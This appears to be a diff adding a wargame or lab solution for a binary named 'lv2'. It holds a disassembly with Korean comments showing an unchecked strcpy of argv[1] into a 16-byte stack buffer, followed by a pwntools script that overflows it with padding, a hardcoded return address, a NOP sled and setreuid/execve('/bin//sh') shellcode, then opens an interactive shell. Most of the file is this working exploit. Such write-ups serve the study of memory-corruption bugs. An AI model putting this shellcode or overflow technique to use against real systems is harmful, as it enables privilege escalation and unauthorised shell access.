@@ -1,0 +1,30 @@
+   0x08048430 <+0>:	push   ebp
+   0x08048431 <+1>:	mov    ebp,esp
+   0x08048433 <+3>:	sub    esp,0x10				; buf : 0x10 bytes
+   0x08048436 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1		; [ebp + 8] : argc 
+   0x0804843a <+10>:	jg     0x8048453 <main+35>			; 1보다 크면 main+35로 jmp
+
+
+   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]		; eax에 argv[0] 주소 mov
+   0x08048456 <+38>:	add    eax,0x4				; eax에 argv[1] 주소 mov
+   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]		; edx에 eax값 mov
+   0x0804845b <+43>:	push   edx				; edx값을 스택에 push
+   0x0804845c <+44>:	lea    eax,[ebp-0x10]			; eax에 변수 주소 복사
+   0x0804845f <+47>:	push   eax				; eax값을 스택에 push
+   0x08048460 <+48>:	call   0x8048370 <strcpy@plt>		; strcpy(str, argv[1]);
+
+
+buf[0x10] + sfp(4) + ret(4) + shellcode
+
+from pwn import *
+
+context.log_level = 'debug'
+
+argv = 'a' * 16 + 'b' * 4 + p32(0xffffd3a5) + '\x90' * 500 + '\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' 
+
+p = process(['./lv2', argv])
+p.sendline('id')
+p.recv()
+p.sendline('my-pass')
+p.recv()
+p.interactive()
